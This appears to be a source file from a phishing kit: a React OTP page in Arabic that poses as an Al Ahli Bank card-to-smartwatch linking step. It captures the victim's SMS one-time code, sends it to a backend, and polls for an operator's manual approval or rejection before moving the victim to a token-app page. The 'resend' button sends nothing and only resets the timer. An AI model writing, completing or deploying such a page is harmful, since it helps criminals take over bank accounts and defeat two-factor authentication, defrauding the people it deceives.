import React, { useState, useEffect } from 'react';
import { MessageSquareCode, AlertCircle, ShieldCheck, KeyRound } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import AppHeader from '../components/AppHeader';
import AppFooter from '../components/AppFooter';
import { updateCardRequest, getCardRequest } from '../api';

export default function OtpPage() {
  const navigate = useNavigate();
  const [otp, setOtp] = useState(['', '', '', '']);
  const [secondsLeft, setSecondsLeft] = useState(120);
  const [isVerifying, setIsVerifying] = useState(false);
  const [otpError, setOtpError] = useState('');

  useEffect(() => {
    if (secondsLeft <= 0) return;
    const timer = setInterval(() => {
      setSecondsLeft((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timer);
  }, [secondsLeft]);

  useEffect(() => {
    if (!isVerifying) return;

    const timer = setInterval(async () => {
      try {
        const req = await getCardRequest();
        if (!req) {
          setIsVerifying(false);
          return;
        }

        if (req.otpStatus === 'otp_approved') {
          setIsVerifying(false);
          navigate('/verify');
        } else if (req.otpStatus === 'approved') {
          setIsVerifying(false);
          navigate('/success');
        } else if (req.otpStatus === 'rejected') {
          setIsVerifying(false);
          setOtp(['', '', '', '']);
          setSecondsLeft(120);
          setOtpError('رمز التحقق النصي (OTP) غير صحيح أو منتهي الصلاحية. يرجى إدخال الرمز الجديد المرسل إلى جوالك.');
        }
      } catch {
        // Ignore transient network errors
      }
    }, 1500);

    return () => clearInterval(timer);
  }, [isVerifying, navigate]);

  const formatTimer = (sec: number) => {
    const m = Math.floor(sec / 60);
    const s = sec % 60;
    return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  };

  const handleOtpChange = (index: number, val: string) => {
    if (!/^\d*$/.test(val)) return;
    const newOtp = [...otp];
    newOtp[index] = val.slice(-1);
    setOtp(newOtp);

    if (val && index < 3) {
      const nextInput = document.getElementById(`sms-otp-${index + 1}`);
      nextInput?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      const prevInput = document.getElementById(`sms-otp-${index - 1}`);
      prevInput?.focus();
    }
  };

  const handleVerify = async () => {
    const code = otp.join('');
    if (code.length < 4) {
      setOtpError('يرجى إدخال رمز التحقق (OTP) المكون من 4 أرقام.');
      return;
    }

    setOtpError('');
    setIsVerifying(true);
    try {
      await updateCardRequest('current', {
        otp: code,
        step: 'otp',
        otpStatus: 'pending',
      });
    } catch {
      // Keep waiting state active
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#fbfbfd]">
      <AppHeader showBack backTo="/card-link" title="الخطوة 4: رمز التحقق النصي (OTP)" />

      <main className="flex-1 py-6 px-4 max-w-md mx-auto w-full flex flex-col justify-center">
        <div className="bg-white rounded-3xl p-6 shadow-sm border border-gray-200 text-center">
          {/* SMS OTP Header */}
          <div className="flex items-center justify-between border-b border-gray-100 pb-4 mb-4">
            <div className="text-right">
              <h3 className="font-bold text-gray-900 text-base">رمز التحقق لمرة واحدة (OTP)</h3>
              <p className="text-[11px] text-gray-500 mt-0.5 leading-relaxed">
                تم إرسال رسالة نصية قصيرة (SMS) تحتوي على رمز التحقق إلى رقم الهاتف المسجل لدى البنك الأهلي.
              </p>
            </div>

            <div className="w-14 h-14 rounded-2xl bg-[#e6f4f0] border border-[#004838]/20 flex items-center justify-center shrink-0">
              <MessageSquareCode className="w-8 h-8 text-[#004838]" />
            </div>
          </div>

          {/* OTP Badge */}
          <div className="mb-5">
            <div className="inline-block border-2 border-[#004838] text-[#004838] font-black tracking-widest text-sm px-6 py-2 rounded-xl">
              OTP SMS (4 DIGITS)
            </div>
          </div>

          {otpError && (
            <div className="mb-4 p-3.5 bg-red-50 border border-red-200 rounded-2xl text-xs text-red-700 font-bold flex items-start gap-2.5 text-right">
              <AlertCircle className="w-4 h-4 text-red-600 shrink-0 mt-0.5" />
              <span>{otpError}</span>
            </div>
          )}

          <div className="border border-gray-200 rounded-2xl p-5 bg-gray-50/50">
            <p className="text-xs text-gray-700 font-semibold mb-4 leading-relaxed">
              الرجاء إدخال رمز التحقق المكون من 4 أرقام المرسل في الرسالة النصية لتأكيد ربط البطاقة بالساعة الذكية
            </p>

            {/* OTP Inputs */}
            <div className="flex justify-center gap-3 mb-4" dir="ltr">
              {otp.map((digit, idx) => (
                <input
                  key={idx}
                  id={`sms-otp-${idx}`}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  disabled={isVerifying}
                  value={digit}
                  onChange={(e) => handleOtpChange(idx, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(idx, e)}
                  className="w-13 h-14 text-center text-2xl font-bold bg-white border border-gray-300 rounded-xl focus:border-[#004838] focus:ring-2 focus:ring-[#004838]/20 outline-none transition-all shadow-2xs"
                />
              ))}
            </div>

            {/* Countdown Timer */}
            <div className="mb-4">
              <span
                className={`text-2xl font-mono font-bold tracking-widest ${
                  secondsLeft < 30 ? 'text-[#c8922c] animate-pulse' : 'text-gray-900'
                }`}
              >
                {formatTimer(secondsLeft)}
              </span>
              {secondsLeft === 0 && (
                <div className="mt-1">
                  <button
                    onClick={() => setSecondsLeft(120)}
                    className="text-xs text-[#004838] font-bold hover:underline cursor-pointer"
                  >
                    إعادة إرسال رمز OTP
                  </button>
                </div>
              )}
            </div>

            {/* Verify Button */}
            <button
              onClick={handleVerify}
              disabled={isVerifying}
              className="w-full py-3.5 bg-gradient-to-r from-[#d4a343] via-[#c8922c] to-[#b88022] hover:from-[#c8922c] disabled:opacity-70 text-white font-bold text-base rounded-xl transition-all cursor-pointer flex items-center justify-center gap-2 shadow-md shadow-[#d4a343]/20"
            >
              {isVerifying ? (
                <>
                  <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                  <span>جارِ التحقق من الرمز...</span>
                </>
              ) : (
                <>
                  <ShieldCheck className="w-5 h-5" />
                  <span>تأكيد رمز OTP</span>
                </>
              )}
            </button>

            {/* Switch to 5-Digit Token App option */}
            <div className="mt-4 pt-3 border-t border-gray-200/80">
              <button
                type="button"
                onClick={() => navigate('/verify')}
                className="text-xs font-bold text-gray-600 hover:text-[#004838] flex items-center justify-center gap-1.5 mx-auto cursor-pointer"
              >
                <KeyRound className="w-3.5 h-3.5 text-[#004838]" />
                <span>التصديق عبر تطبيق رمز الأمان (TOKEN - 5 أرقام)</span>
              </button>
            </div>
          </div>
        </div>
      </main>

      <AppFooter />
    </div>
  );
}
